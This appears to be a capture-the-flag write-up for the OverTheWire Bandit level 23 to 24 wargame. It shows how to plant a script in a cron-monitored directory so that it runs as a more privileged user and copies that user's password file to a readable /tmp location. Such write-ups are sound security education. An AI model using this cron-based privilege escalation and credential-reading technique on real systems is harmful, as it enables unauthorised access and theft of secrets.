# Bandit Level 23 → Level 24

# Objective

Retrieve the password for `bandit24` by creating a shell script that is automatically executed by a cron job running as `bandit24`.

# Challenge

The cron job executes any executable file owned by `bandit23` inside `/var/spool/bandit24/foo`, then deletes it after execution. Since the script runs as `bandit24`, it can access resources that `bandit23` cannot.

# Solution

Inspect the cron configuration:

```bash
cat /etc/cron.d/cronjob_bandit24
```

Read the cron script:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Create a shell script that copies the password to a readable location:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24pass
chmod 444 /tmp/bandit24pass
```

Make it executable and place it in the monitored directory:

```bash
chmod +x pass
cp pass /var/spool/bandit24/foo/
```

Wait for the cron job to execute, then read the password:

```bash
cat /tmp/bandit24pass
```

# Commands Used

1. `cat /etc/cron.d/cronjob_bandit24`
2. `cat /usr/bin/cronjob_bandit24.sh`
3. `chmod +x pass`
4. `cp pass /var/spool/bandit24/foo/`
5. `cat /tmp/bandit24pass`

# Key Learning

- Cron jobs execute with the privileges of the user specified in the cron configuration.
- Temporary privileged execution can be used to access protected resources and store them in a location accessible later.
- Directory permissions are independent of file permissions. A directory with `-wx` allows file creation without allowing directory listing.
- `./script` executes a script with the current user's privileges, while the same script executed by cron runs with the cron user's privileges.
- Automated jobs often leave opportunities to execute controlled code, making cron configuration and scripts valuable targets during security assessments.
